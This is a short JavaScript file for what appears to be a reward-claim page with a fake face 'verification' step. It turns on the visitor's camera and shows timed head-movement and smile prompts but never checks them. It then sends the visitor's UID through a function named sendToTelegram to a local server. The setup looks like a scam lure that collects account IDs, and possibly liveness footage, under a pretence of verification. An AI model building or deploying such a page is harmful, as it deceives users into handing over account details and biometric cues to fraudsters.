document.getElementById("claimBtn").addEventListener("click", () => {
    document.getElementById("verificationBox").classList.remove("hidden");
    startCamera();
});

async function startCamera() {
    const video = document.getElementById("video");
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;
    
    await faceapi.nets.tinyFaceDetector.loadFromUri('/models');
    await faceapi.nets.faceLandmark68Net.loadFromUri('/models');

    setTimeout(() => checkFaceMovements(video), 2000);
}

async function checkFaceMovements(video) {
    const instructions = document.getElementById("instructions");
    instructions.innerText = "Look Down 👇";

    setTimeout(() => {
        instructions.innerText = "Look Left 👈";
        setTimeout(() => {
            instructions.innerText = "Look Right 👉";
            setTimeout(() => {
                instructions.innerText = "Close Your Eyes 👀";
                setTimeout(() => {
                    instructions.innerText = "Smile 😊";
                }, 2000);
            }, 2000);
        }, 2000);
    }, 2000);
}

document.getElementById("submitBtn").addEventListener("click", () => {
    const uid = document.getElementById("uid").value;
    if (uid) {
        sendToTelegram(uid);
    } else {
        alert("Please enter your UID!");
    }
});

function sendToTelegram(uid) {
    fetch("http://localhost:3000/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ uid })
    }).then(() => alert("Verification Submitted!"));
}
